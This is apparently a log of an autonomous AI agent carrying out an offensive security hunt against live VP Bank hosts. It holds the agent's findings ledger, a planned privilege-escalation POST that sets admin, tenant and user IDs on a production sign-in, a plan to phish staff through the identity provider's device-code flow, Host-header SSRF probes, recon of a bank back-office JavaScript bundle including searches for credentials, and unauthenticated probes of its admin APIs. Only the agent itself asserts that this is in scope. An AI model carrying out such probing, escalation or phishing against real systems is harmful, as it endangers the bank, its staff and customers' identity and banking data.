+reasoning: /adfs/.well-known/openid-configuration HTTP 200 exposes device_code grant + password grant + implicit grant; issuer https://sts.vpbank.com/adfs; scopes include vpn/logon/cert — corporate IdP for VPN/certificate auth; device_code flow vulnerable to phishing (user enters code on attacker-controlled device)
+evidence_needed: Successful device_code authorization request returns user_code/device_code/verification_uri; phishing simulation captures tokens
+verify_steps: POST https://sts.vpbank.com/adfs/oauth2/token/devicecode Content-Type: application/x-www-form-urlencoded body: client_id=<unknown>&scope=vpn (read-only: observe 400/401 vs 200; client_id enumeration needed via RAG/mobile apps)
+impact: Corporate VPN/certificate access tokens via device-flow phishing → internal network access; severity HIGH
+testability: AUTH_HELPED
+[PARKED] PSD2 sandbox BOLA carries to production via shared consent-authorization code: confidence 40 < threshold for active pursuit without HUMAN_ONLY eIDAS certs; mTLS at TLS layer makes passive verification impossible; cannot advance without two licensed TPP certificates
+[FINAL] 1. [70] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
+[FINAL] 2. [55] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
+[NEXT] PROBE: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (observe HTTP status, Set-Cookie, redirect, response body — read-only, no account creation)
+[LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Live multi-tenant bank-onboarding/back-office SaaS ('US', Rails+Devise) on off-net hosting (89.163.182.69/.28/.8), anonymous /control-center/ SPA + /api/v1/brand 200, sign_in carries client-controlled admin/tenant/user_id — new in-scope back-office attack surface
+[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId
+[LEARN] REJECTED BUSLOGIC @ developer.vpbank.com (X-Request-ID state encoding): documented deterministic client-driven state for sandbox; observed ACSC from X-Request-ID ending in 1 (docs claim 1=RCVD) — no security-relevant differential
+[LEARN] REJECTED OAUTH @ www.vpbank.com/oauth/authorize: RAG GitHub/public-web surfaces only VP Bank Vietnam (separate entity) + generic PSD2 frameworks; spec contains no OAuth/securitySchemes/client_id — only scaRedirect hrefs ("not available in sandbox")
+[LEARN] REJECTED MISCONFIG @ www.vpbank.com/developer.vpbank.com (PSD2 statistics pages): /psd2-statistics, /psd2-statistics/, /psd2/statistics/ all HTTP 404
+[LEARN] REJECTED SSRF @ api.vpbank.com (Host header routing): verify_steps executed — Host:169.254.169.254, Host:localhost, X-Forwarded-Host:169.254.169.254 all returned identical HTTP 500 JSON — CONFIRMED REJECTED
+[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
+[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — CONFIRMED REJECTED
+[LEARN] REJECTED MISCONFIG @ www.vpbank.com (portal API access): /portal/api/ returns 403 with SPA shell; /portal/api/health and /portal/api/status return WAF maintenance page — no backend accessible
+[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector, low severity
+[LEARN] ACCEPTED MISCONFIG @ developer.vpbank.com (PSD2 Developer Portal exposure): Live PSD2 sandbox API with full OpenAPI spec, functional endpoints (consents, accounts, payments), basic auth only — high-value attack surface not WAF-blocked
+[LEARN] NEW INFO @ openbanking.vpbank.com (193.222.70.154): production PSD2 ASPSP, mTLS "certificate required" at TLS layer — anonymous blocked as designed
+[LEARN] NEW INFO @ sts.vpbank.com: ADFS OIDC metadata 200 (issuer sts.vpbank.com/adfs, device_code/password/implicit grants, vpn/logon/cert scopes) — corporate IdP
+[RISK] vp-bank-ag: 60 — Two new high-value attack surfaces confirmed: (1) digital-onboarding.vpbank.com exposes anonymous back-office SPA + API with Devise mass-assignment vector on sign-in (admin/tenant/user_id client-controlled) — multi-tenant SaaS with onboarding PII, identity docs, banking transactions; (2) sts.vpbank.com ADFS exposes device_code/password/implicit grants for corporate VPN/cert auth — phishing vector. Residual: PSD2 sandbox BOLA proven (80 confidence) but production carryover blocked by mTLS (HUMAN_ONLY); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked.
+[0m
+Let me look at the digital-onboarding details since that's my current focus. Let me check the lead file for digital-onboarding specifics and the hypotheses files.
+Now I understand the state. Both models are converging on `digital-onboarding.vpbank.com` as the top target. The next action (my previous NEXT) was JS bundle extraction from the control-center SPA. Let me execute that - extract the JS bundle to find the actual /api/v1/* routes and sign_in handling, which is the passive-first approach before any live auth probes.
+
+Let me fetch the control-center SPA and its JS bundles.
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && mkdir -p /tmp/opencode/do && curl -s -k -m 20 -o /tmp/opencode/do/control_center.html -w "%{http_code}\n" "https://digital-onboarding.vpbank.com/control-center/" && wc -c /tmp/opencode/do/control_center.html
+200
+3167 /tmp/opencode/do/control_center.html
+[0m
+[0m→ [0mRead /tmp/opencode/do/control_center.html
+This is a React (CRA/Webpack) build. Main bundle is `/control-center/assets/index-w2wOeele.js`. Let me fetch it and the manifest to understand the app. The bundle may be large; let me grab it.
+[0m
+[0m$ [0mcd /tmp/opencode/do && curl -s -k -m 30 -o index.js -w "%{http_code} %{size_download}\n" "https://digital-onboarding.vpbank.com/control-center/assets/index-w2wOeele.js"
+200 3999634
+[0m
+[0m$ [0mcd /tmp/opencode/do && grep -oE '"/api/[^"]*"' index.js | sort -u | head -100
+"/api/v1/brand"
+"/api/v1/current_user_details"
+"/api/v1/qr_codes/generate"
+"/api/v1/sessions"
+"/api/v1/sessions/idp_login"
+"/api/v1/sessions/reset_password"
+"/api/v1/sessions/secure_session"
+"/api/v1/tenants"
+[0m
+A ~4MB bundle. Let me extract API routes, endpoints, and interesting strings from it. Let me search for `/api/`, `sign_in`, `tenant`, `admin`, `login`, CSRF, etc.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '"/[a-zA-Z0-9_/.-]*(onboard|case|ident|transaction|wire|role|user|account|payment|sign)[a-zA-Z0-9_/.-]*"' index.js | sort -u | head -80
+"/admin/api/v1/users"
+"/api/v1/current_user_details"
+"/src/modules/bankingtransactions/duck.jsx"
+"/src/modules/editandsign/duck.js"
+"/src/modules/identonly/duck.ts"
+"/src/modules/incomingwire/duck.js"
+"/src/modules/poacases/duck.ts"
+"/src/modules/roleadmins/duck.js"
+"/src/modules/rolegroups/duck.ts"
+"/src/modules/rolemgmt/duck.ts"
+"/src/modules/roleusers/duck.ts"
+"/src/modules/userlist/duck.ts"
+"/users/password"
+[0m
+Good, let me get more context around these routes and find URL patterns in the axios/fetch calls. Let me search for url strings and other endpoint patterns.
+Excellent - this is a rich lead. The bundle references module paths and admin routes. Let me search for URL endpoint patterns used in axios requests. Let me grep for axios calls and `.get(`/`.post(` patterns with api paths.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '(get|post|put|patch|delete)\("[^"]*"' index.js | sort -u | head -100
+delete("rowSelection"
+get("API_URL"
+get("ASSETS_URL"
+get("Authorization"
+get("Authorization-Invalid"
+get("Content-Disposition"
+get("FORCE_TENANT"
+get("Retry-After"
+get("X-Sentry-Rate-Limits"
+get("accentedSort"
+get("advancedFilterBuilderParams"
+get("advancedFilterParams"
+get("advancedFilterParent"
+get("aggFuncs"
+get("aggregateOnlyChangedColumns"
+get("alignedGrids"
+get("allowContextMenuWithControlKey"
+get("allowDragFromColumnsToolPanel"
+get("allowShowChangeAfterFilter"
+get("alwaysAggregateAtRootLevel"
+get("alwaysMultiSort"
+get("alwaysPassFilter"
+get("alwaysShowHorizontalScroll"
+get("alwaysShowVerticalScroll"
+get("animateRows"
+get("apiCallLogging"
+get("applyQuickFilterBeforePivotOrAgg"
+get("asyncTransactionWaitMillis"
+get("autoGroupColumnDef"
+get("autoSizePadding"
+get("autoSizeStrategy"
+get("baggage"
+get("basename"
+get("blockLoadDebounceMillis"
+get("cacheBlockSize"
+get("cacheOverflowSize"
+get("cacheQuickFilter"
+get("cellFadeDuration"
+get("cellFlashDuration"
+get("cellSelection"
+get("center"
+get("chartMenuItems"
+get("chartThemeOverrides"
+get("chartThemes"
+get("chartToolPanelsDef"
+get("clipboardDelimiter"
+get("code"
+get("colResizeDefault"
+get("columnDefs"
+get("columnHoverHighlight"
+get("columnMenu"
+get("columnTypes"
+get("company"
+get("components"
+get("consoleErrorTriggersSentry"
+get("content-length"
+get("copyGroupHeadersToClipboard"
+get("copyHeadersToClipboard"
+get("customChartThemes"
+get("customizations"
+get("dataTypeDefinitions"
+get("datasource"
+get("debounceVerticalScrollbar"
+get("debug"
+get("debugBarEnabled"
+get("defaultColDef"
+get("defaultColGroupDef"
+get("defaultCsvExportParams"
+get("defaultExcelExportParams"
+get("deltaSort"
+get("detailCellRendererParams"
+get("detailRowAutoHeight"
+get("detailRowHeight"
+get("doesExternalFilterPass"
+get("domLayout"
+get("editType"
+get("embedFullWidthRows"
+get("enableAdvancedFilter"
+get("enableBrowserTooltips"
+get("enableCellEditingOnBackspace"
+get("enableCellExpressions"
+get("enableCellSpan"
+get("enableCellTextSelection"
+get("enableCharts"
+get("enableFillHandle"
+get("enableFilterHandlers"
+get("enableGroupEdit"
+get("enableRangeHandle"
+get("enableRangeSelection"
+get("enableRowPinning"
+get("enableRtl"
+get("enableStrictPivotColumnOrder"
+get("ensureDomOrder"
+get("enterNavigatesVertically"
+get("enterNavigatesVerticallyAfterEdit"
+get("excelStyles"
+get("excludeChildrenWhenTreeDataFiltering"
+get("fakeHScrollComp"
+get("fakeVScrollComp"
+get("fillHandleDirection"
+[0m
+That's mostly Ag-Grid config. Let me focus specifically on the API call patterns. Let me look at how endpoints are constructed - searching for template literals with `/api/v1/` and axios interceptor config, `ApiClient`, base URL etc.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '.{0,40}/api/v1/[a-zA-Z0-9_/${}./-]+.{0,40}' index.js | grep -oE 'api/v1/[a-zA-Z0-9_/${}./-]+' | sort -u | head -100
+api/v1/brand
+api/v1/current_user_details
+api/v1/qr_codes/generate
+api/v1/sessions
+api/v1/sessions/idp_login
+api/v1/sessions/secure_sessi
+api/v1/tenants
+api/v1/users
+api/v1/users/${e}
+[0m
+Let me look at the axios base configuration and interceptor to understand how requests are built and where the base URL comes from. Let me search for "axios" and "baseURL" and look at the API client module.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '.{0,30}baseURL.{0,60}' index.js | head -20; echo "===API_URL==="; grep -oE '.{0,30}API_URL.{0,60}' index.js | head -20
+===API_URL===
+,ASSETS_URL:"/control-center",API_URL:"http://localhost:3000",modules:[],printConfig:!1,maxSnack:
+Me={basename:"control-center",API_URL:"",printConfig:!1,modules:[]},uA=[eMe],OW="production";swit
+indexOf("http")===0?e:It.get("API_URL")+e;const o=r?.endpoint_parameters||{};!Object.prototype.ha
+indexOf("http")===0?t:It.get("API_URL")+t;const u=n?.endpoint_parameters||{};!Object.prototype.ha
+[0m
+Interesting - an `endpoint_parameters` construct. Let me look at the API request-building code around `endpoint_parameters`, this looks like a place where params are merged into URLs. Let me extract surrounding context.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '.{0,200}endpoint_parameters.{0,300}' index.js | head -5
+E",j4="SET_TENANT",xUe={FETCH_TENANTLIST_REQUEST:$4,FETCH_TENANTLIST_SUCCESS:z4,FETCH_TENANTLIST_FAILURE:W4,SET_TENANT:j4},TUe=(e={})=>Ql.createApiAction({types:[$4,z4,W4]})({endpoint:KD.tenantList(),endpoint_parameters:e,suppress_notification:!0}),_Ue=e=>({type:j4,payload:e}),RUe={fetchTenantList:TUe,setTenant:_Ue},PUe=e=>Pw(e).force_tenant,AUe=e=>({tenantlist:Pw(e).tenantlist,tenantlist_loading:Pw(e).tenantlist_loading,tenantlist_error:Pw(e).tenantlist_error,demo:Pw(e).demo,force_tenant:Pw(e).force_tenant}),IUe=
+\n]*=((['"]).*?\2|[^;\n]*)/.exec(e);if(n?.[1])return n[1].replace(/['"]/g,"")}}catch{}};async function Dx(e,t,n,r){Mf("callApi",e,"alert");let i=e.indexOf("http")===0?e:It.get("API_URL")+e;const o=r?.endpoint_parameters||{};!Object.prototype.hasOwnProperty.call(o,"force_tenant")&&It.has("FORCE_TENANT")&&It.get("FORCE_TENANT")&&(o.force_tenant=It.get("FORCE_TENANT")),i=Ere(i,o);let s=Cp({},{method:t,headers:r?.noDefaultHeaders?{}:{Accept:"application/json","Content-Type":"application/json"}},r);const a=oy.getAuthTo
+KUe(e){const{endpoint:t,types:n,method:r="GET",body:i=null,suppress_notification:o=!1,finalFormSubmissionCallback:s=VUe,...a}=e.meta,[l,c,u]=n;let d=o;try{const h=yield Nb(ey.selectForceTenant);h&&(a.endpoint_parameters={...a.endpoint_parameters,force_tenant:h}),yield $n({type:l,meta:e.meta});const f=yield Gn(Dx,t,r,i,a);yield $n({type:c,payload:f,meta:e.meta}),yield Gn(s)}catch(h){const f=w4(h);bte(h,f),console.error("API Error:",r,t,f),yield $n({type:u,payload:f,meta:e.meta,response:h.text});const v=/^\[\d\d\d\]
+tatusText,y.url=o.responseURL,i(y)};o.addEventListener("error",l,!1),o.addEventListener("timeout",l,!1),o.addEventListener("loadend",a,!1);let c=t.indexOf("http")===0?t:It.get("API_URL")+t;const u=n?.endpoint_parameters||{};!Object.prototype.hasOwnProperty.call(u,"force_tenant")&&It.has("FORCE_TENANT")&&It.get("FORCE_TENANT")&&(u.force_tenant=It.get("FORCE_TENANT")),c=Ere(c,u);const d=encodeURI(c);o.open("POST",d,!0),s&&o.setRequestHeader("Authorization",`Bearer ${s}`);const h=new FormData;for(let f=0;f<e.length;f
+oe,meta:{key:e,types:t,path:n,fetchOptions:r,...i,...s,files:o,started:Date.now()}}}}function*l6e(e){const{meta:t}=e,{files:n,types:[r,i,o,s],path:a}=t;try{const l=t.fetchOptions||{};t?.fetchOptions?.endpoint_parameters||(l.endpoint_parameters={});const c=yield Nb(ey.selectForceTenant);c&&(l.endpoint_parameters={...l.endpoint_parameters,force_tenant:c}),yield $n({type:r,meta:t});const u=yield Gn(s6e,n,{path:a,...l});yield $n({type:o,payload:u,meta:t})}catch(l){if(!(l instanceof C4)){yield $n({type:s,meta:t,payload
+[0m
+Now I understand the API client mechanics. There's a `FORCE_TENANT` mechanism - a global header/param that forces tenant context on API requests. This is a potential cross-tenant vector. Let me see where `force_tenant` comes from and how tenant identity is established. Let me look at the `Ere` URL builder and the auth mechanism (`getAuthToken`).
+
+Let me extract the key module endpoint definitions. Let me look for `KD=` (the endpoint constants) and module endpoint paths.
+[0m$ [0mcd /tmp/opencode/do && grep -oE 'KD=[^;]{0,400}' index.js | head -3
+KD={activestorage:QUe,users:e6e,user:X4,getEmail:t6e,sendEmail:n6e,tenantList:r6e},noe="CALL_API_ACTIVESTORAGE"
+[0m
+[0m$ [0mcd /tmp/opencode/do && grep -oE '(QUe|e6e|X4|t6e|n6e|r6e)=[^,;]{0,120}' index.js | sort -u | head -20
+QUe=()=>"/rails/active_storage/direct_uploads"
+X4=(e
+e6e=()=>"/admin/api/v1/users"
+n6e=e=>`${X4(e)}/emails`
+r6e=()=>"/api/v1/tenants"
+t6e=(e
+[0m
+Let me look at the `users` and `user` endpoint definitions and the module-level API paths used in the admin modules. Let me search for the module path patterns like `/api/v1/` used with template strings in the module ducks.
+
+Let me grep for `onboarding`, `ident`, `bankingtransactions` endpoint strings more specifically.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '.{0,60}(onboard|ident|bankingtrans|incomingwire|roleadmin|rolegroup|roleuser|poacase|userlist)[a-zA-Z0-9_/.-]*.{0,40}' index.js | grep -iE 'api|/admin/' | head -60
+d_url-redownload":"DOWNLOAD","devexpress-columntitle-simple_onboarding_status":"STATUS","api-value-simple_onboarding_
+status-OFFEN":"OFFEN","api-value-simple_onboarding_status-ABGESCHLOSSEN":"ABGESCHLOSSEN","api-value-simple_onbo
+-KUNDENUNTERSCHRIFT":"KUNDENUNTERSCHRIFT","api-value-simple_onboarding_status-KUNDENINFORMATIONSBLATT":"KUNDENINFORMATIONSBLATT","api-value-s
+imple_onboarding_status-LEGITIMATION_AUSSTEHEND":"LEGITIMATION AUSSTEHEND","api-value-s
+tle-marker":"SEGMENT","api-value-ident_documents-download":"DOWNLOAD","api-value-ident_documents-
+redownload":"REDOWNLOAD","api-value-ident_documents-no-download":"NICHT ERHALTEN","api-value-ident_docu
+ments-DOWNLOAD":"DOWNLOAD","api-value-ident_documents-REFETCH":"REDOWNLOAD","api-value-ident_document
+lue-client_type-institutional_investor":"UNUSED","api-value-onboarding-status-OFFEN":"OFFEN","api-value-onboarding-status-A
+BGESCHLOSSEN":"ABGESCHLOSSEN","api-value-onboarding-status-KUNDENUNTERSCHRIFT":"KUNDENUNTERSCHRIFT","api-value-onboar
+NDENINFORMATIONSBLATT":"KUNDENINFORMATIONSBLATT","api-value-onboarding-status-LEGITIMATION_AUSSTEHEND":"LEGITIMATION AUSSTEHEND","api-value-o
+ive":"NEGATIV","api-value-option-paid":"BEZAHLT","api-value-onboarding_process_status-undefined":" ","api-value-onboarding_process_stat
+us-finished":"ABGESCHLOSSEN","api-value-onboarding_process_status-not_started":"NICHT BEGONNEN","api-value-onboarding
+_process_status-doing":"IN BEARBEITUNG ","api-value-onboarding_process_status-sent_to_client":"AN KUNDEN GESENDET","api-value-onboar
+ing_process_status-in_progress":"IN BEARBEITUNG","api-value-onboarding_process_status-signed":"UNTERSCHRIEBEN","api-value-onboarding
+ss_status-partially_signed":"TEILWEISE SIGNIERT","api-value-onboarding_process_status-rejected":"ABGELEHNT","api-value-onboarding_proc
+ess_status-expired":"ABGELAUFEN","api-value-onboarding_process_status-failed":"FEHLGESCHLAGEN","api-value-onboarding
+_process_status-draft":"ENTWURF","api-value-onboarding_process_status-to_be_verified":"MUSS BESTÄTIGT WERDEN","api-value-onb
+ss_status-PARTIALLY_SIGNED":"TEILWEISE SIGNIERT","api-value-onboarding_process_status-FAILED":"FEHLGESCHLAGEN","api-value-client_app
+","api-value-webid_status-failed":"FAILED","api-value-video_ident-successful":"UNUSED","api-value-video_ident-not_su
+-value-overall_status-COMPLETED":"ABGESCHLOSSEN","api-value-onboarding_process_status-IN_PROGRESS":"IN BEARBEITUNG","api-value-onboarding
+_process_status-SIGNED":"UNTERSCHRIEBEN","api-value-onboarding_process_status-SENT_TO_CLIENT":"AN KUNDEN GESENDET","api-value-onboar
+ding_process_status-EXPIRED":"ABGELAUFEN","api-value-onboarding_process_status-REJECTED":"ABGELEHNT","api-value-onboarding_proc
+ess_status-DRAFT":"ENTWURF","api-value-onboarding_process_status-TO_BE_VERIFIED":"MUSS BESTÄTIGT WERDEN","api-value-edi
+tsign_onboarding_process_status-IN_PROGRESS":"IN BEARBEITUNG","api-value-editsign_o
+process_status-SIGNED":"UNTERSCHRIEBEN","api-value-editsign_onboarding_process_status-SENT_TO_CLIENT":"AN KUNDEN GESENDET","api-value-editsi
+gn_onboarding_process_status-EXPIRED":"ABGELAUFEN","api-value-editsign_onboa
+ng_process_status-REJECTED":"ABGELEHNT","api-value-editsign_onboarding_process_status-DRAFT":"ENTWURF","api-value-editsign_onboardi
+TO_BE_VERIFIED":"MUSS BESTÄTIGT WERDEN","api-value-editsign_onboarding_process_status-NOT_STARTED":"NICHT GESTARTET","atom-detailsrow-sta
+account_type-JOINT_ACCOUNT":"GEMEINSCHAFTSKONTO","api-value-onboarding_process_status-NOT_STARTED":"NICHT BEGONNEN","api-value-onboarding
+_process_status-DOING":"IN BEARBEITUNG ","api-value-onboarding_process_status-FINISHED":"ABGESCHLOSSEN","api-value-salutation-
+e-beneficiary":"BENEFICIARY","devexpress-columntitle-simple_onboarding_status":"STATUS","api-value-simple_onboarding_
+status-OFFEN":"OPEN","api-value-simple_onboarding_status-ABGESCHLOSSEN":"CLOSED","api-value-simple_onboarding_
+-KUNDENUNTERSCHRIFT":"CUSTOMER SIGNATURE","api-value-simple_onboarding_status-KUNDENINFORMATIONSBLATT":"CUSTOMER HANDOUT","api-value-simple_o
+MATION_AUSSTEHEND":"LEGITIMATION PENDING","api-value-simple_onboarding_status-COMPLIANCE_UNTERSCHRIFT":"COMPLIANCE SIGNATURE","devexpress-col
+tle-marker":"SEGMENT","api-value-ident_documents-download":"DOWNLOAD","api-value-ident_documents-
+redownload":"REDOWNLOAD","api-value-ident_documents-no-download":"NOT RECEIVED","api-value-ident_docume
+nts-DOWNLOAD":"DOWNLOAD","api-value-ident_documents-REFETCH":"REDOWNLOAD","api-value-ident_document
+ned":" ","api-value-client_type-verify":"VERIFY","api-value-onboarding-status-OFFEN":"NOT COMPLETED","api-value-onboarding-
+status-ABGESCHLOSSEN":"COMPLETED","api-value-onboarding-status-KUNDENUNTERSCHRIFT":"CUSTOMER SIGNATURE","api-value-onboar
+atus-KUNDENINFORMATIONSBLATT":"CUSTOMER HANDOUT","api-value-onboarding-status-LEGITIMATION_AUSSTEHEND":"LEGITIMATION PENDING","api-value-onbo
+","api-value-process_status-rejected":"REJECTED","api-value-onboarding_process_status-undefined":" ","api-value-onboarding_process_stat
+us-finished":"FINISHED","api-value-onboarding_process_status-not_started":"NOT STARTED","api-value-onboarding_pr
+ocess_status-doing":"DOING","api-value-onboarding_process_status-sent_to_client":"SENT TO CLIENT","api-value-onboarding
+_process_status-in_progress":"IN PROGRESS","api-value-onboarding_process_status-signed":"SIGNED","api-value-onboarding_process
+_status-partially_signed":"PARTIALLY SIGNED","api-value-onboarding_process_status-rejected":"REJECTED","api-value-onboarding_proce
+ss_status-expired":"EXPIRED","api-value-onboarding_process_status-failed":"FAILED","api-value-onboarding_process
+_status-draft":"DRAFT","api-value-onboarding_process_status-PARTIALLY_SIGNED":"PARTIALLY SIGNED","api-value-onboardi
+ue-client_application_docs-REFETCH":"REDOWNLOAD","api-value-onboarding_process_status-to_be_verified":"TO BE VERIFIED","api-value-import_typ
+","api-value-webid_status-failed":"FAILED","api-value-video_ident-successful":"SUCCESSFUL","api-value-video_ident-no
+"api-value-overall_status-COMPLETED":"COMPLETED","api-value-onboarding_process_status-IN_PROGRESS":"IN PROGRESS","api-value-onboarding_pr
+ocess_status-SIGNED":"SIGNED","api-value-onboarding_process_status-SENT_TO_CLIENT":"SENT TO CLIENT","api-value-onboarding
+_process_status-EXPIRED":"EXPIRED","api-value-onboarding_process_status-REJECTED":"REJECTED","api-value-onboarding_proce
+ss_status-DRAFT":"DRAFT","api-value-onboarding_process_status-TO_BE_VERIFIED":"TO BE VERIFIED","api-value-editsign_o
+ocess_status-IN_PROGRESS":"IN PROGRESS","api-value-editsign_onboarding_process_status-SIGNED":"SIGNED","api-value-editsign_onboardin
+status-SENT_TO_CLIENT":"SENT TO CLIENT","api-value-editsign_onboarding_process_status-EXPIRED":"EXPIRED","api-value-editsign_onboardi
+ng_process_status-REJECTED":"REJECTED","api-value-editsign_onboarding_process_status-DRAFT":"DRAFT","api-value-editsign_onboarding
+status-TO_BE_VERIFIED":"TO BE VERIFIED","api-value-editsign_onboarding_process_status-NOT_STARTED":"NOT STARTED","atom-detailsrow-started
+alue-account_type-JOINT_ACCOUNT":"JOINT ACCOUNT","api-value-onboarding_process_status-NOT_STARTED":"NOT STARTED","api-value-onboarding_pr
+ocess_status-DOING":"DOING","api-value-onboarding_process_status-FINISHED":"FINISHED","api-value-salutation-ms":"
+e-sender_name":"SENDER NAME","devexpress-columntitle-simple_onboarding_status":"STATUS","api-value-simple_onboarding_
+[0m
+The i18n dictionary gives insight into the data model but not direct endpoint paths. The key insight is the `FORCE_TENANT` mechanism. Let me trace how the app determines the tenant and how `force_tenant` is used cross-tenant. Let me look at auth/token handling and the idp_login / secure_session flow. Let me search for how sessions are created and tenant binding.
+
+Let me examine the actual API route paths defined for the admin modules. Let me search for `.js` chunks - this is likely code-split. The main bundle only has base API. Let me check the manifest for chunk files or fetch the module-specific chunks.
+
+Actually, let me look more carefully at how the client sets tenant during auth. Let me hunt for the login/auth flow and `FORCE_TENANT` persistence.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '.{0,80}(idp_login|secure_session|reset_password|sessions)[^"]{0,120}' index.js | head -30
+e.contentType,attachment_type:e.attachmentType},t]}const vCe={session:"session",sessions:
+.toISOString(),...i&&{sdk:i},...!!r&&t&&{dsn:Sy(t)}},s="aggregates"in e?[{type:"sessions
+_IDP_TOKEN_PROCESSED:r4},Symbol.toStringTag,{value:"Module"})),Sre=()=>"/api/v1/sessions
+",sGe=()=>"/users/password",aGe=()=>"/api/v1/sessions/reset_password
+",lGe=()=>"/api/v1/qr_codes/generate",cGe=()=>"/api/v1/sessions/secure_session
+",uGe=()=>"/api/v1/sessions/idp_login
+[0m
+Let me look at the session endpoint module more deeply including the login flow, and search for the sign_in handling and any dev/test credentials in the bundle. Let me look at the /users/sign_in form handling and how the SPA actually does authentication.
+
+Let me search for the login/auth token and any hardcoded credentials/dev backdoors.
+[0m$ [0mcd /tmp/opencode/do && grep -oiE '(password|secret|apikey|api_key|token|credential|test:[a-z]+|dev@|admin@|1234|password123)[^"'"'"']{0,40}' index.js | sort -u | grep -iv 'placeholder\|label\|error\|hint\|validate\|required\|forgot\|reset\|confirm\|change\|current\|new_password\|password_confirmation\|PasswordSign\|PasswordRes' | head -40
+12341634,3803740692,2075208622,213261112,246
+123456789+/
+123456789+/=
+123456789abcdef
+123456789abcdefghijklmnopqrstuvwxyzABCDEFGHI
+1234](er|ème|e)? trimestre/i},o4e={any:[/1/i
+1234]/i,abbreviated:/^[1234](er|ème|e)? trim
+1234]/i,abbreviated:/^q[1234]/i,wide:/^[1234
+1234]/i,abbreviated:/^t[1234]/i,wide:/^[1234
+PASSWORD
+PASSWORD_EXPIRED
+PASSWORD_EXPIRED)try{const{password_expiry_month
+PASSWORD_EXPIRED:
+PASSWORD_FAILURE
+PASSWORD_FAILURE:d4,FETCH_UPDATE_PASSWORD_REQUES
+PASSWORD_REQUEST
+PASSWORD_SUCCESS
+PASSWORD_SUCCESS:a4,FETCH_GENERATEQR_CONTINUE:g4
+PASSWORD_SUCCESS:u4,LOGIN:DD,LOGINIDP:e4,LOGOUT:
+Password
+Password must be at least {requirement} characte
+Password must contain at least {requirement} low
+Password must contain at least {requirement} num
+Password must contain at least {requirement} sym
+Password must contain at least {requirement} upp
+Password requirements
+Password(),R(oe)},[e]),O=oe=>{const{email:Z}=oe;
+Password(Z,{redirect_to:encodeURIComponent(`${S}
+Password(e),n=Go.getUpdatePassword(e),r=Go.getOT
+Password(oe,Z||(()=>{}),{locale:_d(b.locale)})},
+Password,onClick:n,
+Password:H6e,generateQR:loe,generateQRContinueTr
+Password:Pat,getIsAuthenticated:_at,getModules:Q
+Password:{float:
+PasswordClick:()=>F(),onSubmit:I}),[h,f,d,v,e,F,
+PasswordClick:O,onContinueClick:()=>F(!1),loadin
+PasswordClick:e,onContinueClick:t,loading:n=!1,s
+PasswordClick:n,otpChallenge:r,classes:i,termsAn
+PasswordFetching:!1,updatePasswordSuccess:null,u
+PasswordFetching:!1,updatePasswordSuccess:t.payl
+[0m
+No hardcoded credentials directly visible. Let me check the admin routes since there was `/admin/api/v1/users`. Let me look at how the SPA handles routing to admin modules and whether any admin endpoints are reachable anonymously. Let me check the auth token flow - the login flow. Let me look at the `sign_in` in the DEV site which is more likely to be testable, since prod requires real creds.
+
+Let me pivot: check the dev/stage tenants of digital-onboarding which may have weaker auth or test data, and enumerate the /api/v1/ routes more. Let me check if there are anonymous-accessible endpoints among the discovered ones.
+
+First, let me look at what `/api/v1/sessions`, `/api/v1/current_user_details`, `/api/v1/users` return anonymously on prod.
+
+Given the program's no-data-modification/no-live-customer-data rules, I must only use read-only GET probes and avoid auth bypass/mutation on live data. Let me check the anonymous behavior of these endpoints carefully with GET (read-only).
+[0m$ [0mcd /tmp/opencode/do && for p in "api/v1/current_user_details" "api/v1/users" "api/v1/sessions" "api/v1/tenants" "api/v1/brand"; do echo "=== /$p ==="; curl -s -k -m 15 -o /tmp/opencode/do/resp.txt -w "HTTP %{http_code} size=%{size_download}\n" "https://digital-onboarding.vpbank.com/$p"; head -c 400 /tmp/opencode/do/resp.txt; echo; sleep 1; done
+=== /api/v1/current_user_details ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <style>
+    body {
+      background-color: #EFEFEF;
+      color: #2E2F30;
+      margin: 0;
+    }
+
+    p.error-message {
+      font-size: 40px;
+      color: #cc7b0a;
+      text-align: center;
+      fon
+=== /api/v1/users ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <style>
+    body {
+      background-color: #EFEFEF;
+      color: #2E2F30;
+      margin: 0;
+    }
+
+    p.error-message {
+      font-size: 40px;
+      color: #cc7b0a;
+      text-align: center;
+      fon
+=== /api/v1/sessions ===
+HTTP 404 size=1793
+<!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
